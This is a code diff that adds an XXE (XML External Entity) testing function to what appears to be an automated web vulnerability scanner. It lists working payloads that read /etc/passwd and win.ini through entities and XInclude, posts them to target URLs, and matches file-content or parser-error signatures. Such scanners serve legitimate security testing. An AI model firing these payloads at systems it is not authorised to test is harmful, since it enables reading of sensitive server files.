@@ -1973,3 +1973,130 @@ async def test_rate_limit(
         "lockout_detected": lockout_detected,
         "evidence": evidence,
     }
+
+
+# ---------------------------------------------------------------------------
+# XXE (XML External Entity) Testing
+# ---------------------------------------------------------------------------
+
+_XXE_PAYLOADS: list[tuple[str, str, str]] = [
+    # (payload, technique_name, os_target)
+    (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        '<root>&xxe;</root>',
+        "file-read",
+        "linux",
+    ),
+    (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
+        '<root>&xxe;</root>',
+        "file-read",
+        "windows",
+    ),
+    (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
+        '<root>test</root>',
+        "parameter-entity",
+        "linux",
+    ),
+    (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+        '<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
+        "soap-xxe",
+        "linux",
+    ),
+    (
+        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+        '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
+        "xinclude",
+        "linux",
+    ),
+]
+
+_XXE_LINUX_INDICATORS = re.compile(r"root:|bin/bash|bin/sh|sbin/nologin")
+_XXE_WINDOWS_INDICATORS = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit")
+_XXE_ERROR_INDICATORS = re.compile(
+    r"entity|DTD|DOCTYPE|SAXParseException|XMLSyntaxError|lxml\.etree",
+    re.I,
+)
+
+
+async def test_xxe(
+    target_url: str, param: str = "", original_value: str = "",
+) -> dict[str, Any]:
+    """Test for XML External Entity injection via XML/SOAP POST payloads."""
+    content_types = ["application/xml", "text/xml"]
+
+    try:
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession() as session:
+            for xml_payload, technique, os_target in _XXE_PAYLOADS:
+                for ct in content_types:
+                    headers = {
+                        **_HEADERS,
+                        **_AUTH_HEADERS,
+                        "Content-Type": ct,
+                    }
+                    try:
+                        async with session.post(
+                            target_url,
+                            data=xml_payload,
+                            headers=headers,
+                            ssl=False,
+                            timeout=timeout,
+                        ) as resp:
+                            body = await resp.text(errors="replace")
+                            body = body[:50_000]
+                            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
+
+                            # Check for Linux file read indicators
+                            if os_target == "linux":
+                                match = _XXE_LINUX_INDICATORS.search(body)
+                                if match:
+                                    return {
+                                        "vulnerable": True,
+                                        "url": target_url,
+                                        "payload": xml_payload,
+                                        "evidence": f"XXE file read: {body[max(0, match.start() - 20):match.end() + 80].strip()}",
+                                        "technique": technique,
+                                        "confidence": "high",
+                                    }
+
+                            # Check for Windows file read indicators
+                            if os_target == "windows":
+                                match = _XXE_WINDOWS_INDICATORS.search(body)
+                                if match:
+                                    return {
+                                        "vulnerable": True,
+                                        "url": target_url,
+                                        "payload": xml_payload,
+                                        "evidence": f"XXE file read (Windows): {body[max(0, match.start() - 20):match.end() + 80].strip()}",
+                                        "technique": technique,
+                                        "confidence": "high",
+                                    }
+
+                            # Error-based detection — XML parser errors suggest
+                            # entity processing was attempted
+                            error_match = _XXE_ERROR_INDICATORS.search(body)
+                            if error_match:
+                                return {
+                                    "vulnerable": True,
+                                    "url": target_url,
+                                    "payload": xml_payload,
+                                    "evidence": f"XXE error-based: XML parser error '{error_match.group(0)}' suggests entity processing",
+                                    "technique": technique,
+                                    "confidence": "low",
+                                }
+
+                    except Exception:
+                        continue
+
+    except Exception as exc:
+        logger.debug("xxe_test_error", url=target_url, error=str(exc))
+
+    return {"vulnerable": False, "url": target_url}
